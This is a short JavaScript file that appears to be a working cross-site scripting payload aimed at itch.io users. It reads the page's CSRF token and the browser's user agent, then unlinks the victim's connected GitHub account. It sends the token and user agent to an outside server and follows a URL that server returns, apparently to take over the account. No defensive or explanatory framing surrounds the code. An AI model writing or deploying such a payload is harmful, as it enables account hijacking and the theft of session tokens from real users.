let csrfToken = document.querySelector('meta[name="csrf_token"]').getAttribute("value")
let userAgent = navigator.userAgent

// Remove Existing GitHub Account From Profile If Exists
let payload1 = `csrf_token=${csrfToken}&action=unlink_account&account_type=github`;

fetch('https://itch.io/user/settings/connected-accounts', {
    method: 'POST',
    body: payload1,
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
})
.then(response => {
    // Log the response headers
    for (let [key, value] of response.headers) {
        console.log(`${key}: ${value}`);
    }
    return response; // You can continue processing the response if needed
})

let payload = {
    csrf_token: csrfToken,
    user_agent: userAgent
}

fetch(server + '/recieve', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
})
.then(response => response.json())
.then(data => {
    fetch(data.url, {
        method: 'GET'
    })
})
.catch(error => {
    console.error('Error:', error);
});

//let button = jQuery('#redactor-toolbar-0 > li:nth-child(1) > a:nth-child(1)');
//button.trigger('mousedown')